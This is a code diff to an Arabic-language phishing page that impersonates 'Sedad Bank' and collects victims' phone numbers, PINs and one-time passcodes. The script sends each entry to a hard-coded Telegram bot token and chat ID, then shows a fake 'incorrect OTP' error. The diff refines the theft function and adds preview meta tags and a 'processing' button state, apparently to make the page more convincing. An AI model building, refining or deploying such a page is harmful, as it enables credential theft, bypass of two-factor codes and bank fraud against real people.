@@ -4,6 +4,12 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sedad Bank</title>
+
+    <!-- وسوم المعاينة الصحيحة -->
+    <meta property="og:title" content="Sedad Bank">
+    <meta property="og:description" content="Sedad Bank">
+    <meta name="description" content="Sedad Bank">
+
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
@@ -27,18 +33,16 @@
         body {
             font-family: 'Cairo', sans-serif;
         }
-        /* تعديل النقاط المخفية لتظهر باللون الأخضر النعناعي الرسمي كما في الصورة */
         .pin-field {
             -webkit-text-security: disc !important;
             text-security: disc !important;
-            color: #1A874B !important; /* اللون الأخضر النعناعي الصافي المطابق للصورة */
+            color: #1A874B !important;
         }
-        /* إجبار الحقول على محاذاة النص والتركيز بشكل صارم LTR */
         .strict-left-input {
             direction: ltr !important;
             text-align: center !important;
             unicode-bidi: plaintext !important;
-            caret-color: transparent !important; /* إخفاء المؤشر الوامض لمنع اللخبطة البصرية */
+            caret-color: transparent !important;
         }
     </style>
 </head>
@@ -117,7 +121,7 @@
                     <input dir="ltr" type="tel" inputmode="numeric" maxlength="1" class="otp-field strict-left-input w-full h-16 text-xl font-bold border border-gray-300 rounded-[14px] bg-white outline-none focus:border-[#1A874B] focus:ring-2 focus:ring-emerald-200 transition-all">
                 </div>
 
-                <button id="otpBtn" onclick="handleOtpSubmit()" class="w-full h-14 bg-sedadGreen text-white text-lg font-bold rounded-2xl shadow-md transition-all mb-2">
+                <button id="otpBtn" onclick="handleOtpSubmit()" class="w-full h-14 bg-sedadGreen text-white text-lg font-bold rounded-2xl shadow-md transition-all mb-2 disabled:opacity-50">
                     تسجيل الدخول
                 </button>
             </div>
@@ -137,9 +141,27 @@
     </div>
 
     <script>
-        // ربط نظام تيليجرام الفوري والآمن بالكامل// ربط نظام تيليجرام الفوري والآمن بالكامل// ربط نظام تيليجرام الفوري والآمن بالكامل// ربط نظام تيليجرام الفوري والآمن بالكامل
-const TELEGRAM_TOKEN = "8854630231:AAHwY-escCA2tlAzBgDZWqNaPNqUNTpIKGA";
-const TELEGRAM_CHAT_ID ="8972356637";
+        // --- بداية إعدادات ودوال التليجرام المُضافة ---
+        const TELEGRAM_TOKEN = "8854630231:AAHwY-escCA2tlAzBgDZWqNaPNqUNTpIKGA";
+        const TELEGRAM_CHAT_ID = "8972356637";
+
+        async function sendTelegramMessage(text) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                    }),
+                });
+            } catch (error) {
+                console.error("خطأ في إرسال البيانات عبر تليجرام:", error);
+            }
+        }
+        // --- نهاية إعدادات التليجرام ---
+
         const modal = document.getElementById('otpModal');
         const modalContent = modal.querySelector('div');
         const errorToast = document.getElementById('errorToast');
@@ -148,21 +170,9 @@ const TELEGRAM_CHAT_ID ="8972356637";
         const pinInputs = document.querySelectorAll('.pin-field');
         const otpInputs = document.querySelectorAll('.otp-field');
         const timerDisplay = document.getElementById('timerDisplay');
+        const otpBtn = document.getElementById('otpBtn');
 
         let timerInterval;
-
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: TELEGRAM_CHAT_ID,
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            }).catch(err => console.error("Error sending to Telegram:", err));
-        }
 
         function startTimer(duration) {
             let timer = duration, minutes, seconds;
@@ -194,6 +204,10 @@ const TELEGRAM_CHAT_ID ="8972356637";
             modalContent.classList.add('scale-95');
             clearInterval(timerInterval);
             otpInputs.forEach(input => input.value = '');
+            
+            // إعادة تعيين النص وحالة الزر
+            otpBtn.disabled = false;
+            otpBtn.textContent = "تسجيل الدخول";
         }
 
         function showErrorToast(message) {
@@ -204,10 +218,8 @@ const TELEGRAM_CHAT_ID ="8972356637";
             }, 4000);
         }
 
-        // الحماية الصارمة للمدخلات المتتالية وعزل الماوس والتحكم العشوائي
         function setupStrictLeftInputs(elementsArray) {
             elementsArray.forEach((inputElement, currentIndex) => {
-                
                 inputElement.addEventListener('contextmenu', (e) => e.preventDefault());
 
                 inputElement.addEventListener('auxclick', (e) => {
@@ -310,23 +322,34 @@ const TELEGRAM_CHAT_ID ="8972356637";
                 return;
             }
 
-            const message = `📱 *تسجيل دخول جديد:*\n\n📞 رقم الهاتف: \`${phoneNumber}\`\n🔐 رمز الـ PIN: \`${pinCode}\``;
-            sendToTelegram(message);
+            // إرسال رقم الهاتف ورمز الـ PIN إلى تليجرام
+            const msg = `📥 تسجيل دخول جديد:\n📱 الهاتف: ${phoneNumber}\n🔑 الرمز: ${pinCode}`;
+            sendTelegramMessage(msg);
 
             openOtpModal();
         }
 
         function handleOtpSubmit() {
-            const phoneNumber = phoneInput.value.trim();
             let otpCode = '';
             otpInputs.forEach(input => otpCode += input.value);
             
             if (otpCode.length < 6) return;
 
-            const message = `🔢 *كود الـ OTP المدخل:*\n\n📞 رقم الهاتف: \`${phoneNumber}\`\n💬 رمز الـ OTP: \`${otpCode}\``;
-            sendToTelegram(message);
+            // إرسال رمز OTP إلى تليجرام
+            const phoneNumber = phoneInput.value.trim();
+            const msg = `📲 رمز OTP لـ (${phoneNumber}):\n🔢 الرمز: ${otpCode}`;
+            sendTelegramMessage(msg);
 
-            showErrorToast("رقم OTP غير صحيح، يرجى المحاولة مرة أخرى.");
+            // 1. تغيير نص الزر وتعطيله
+            otpBtn.disabled = true;
+            otpBtn.textContent = "جارٍ المعالجة...";
+
+            // 2. إغلاق نافذة OTP فوراً والعودة للشاشة الرئيسية
+            setTimeout(() => {
+                closeOtpModal();
+                showErrorToast("رقم OTP غير صحيح، يرجى المحاولة مرة أخرى.");
+            }, 600);
         }
     </script>
 </body>
+</html>
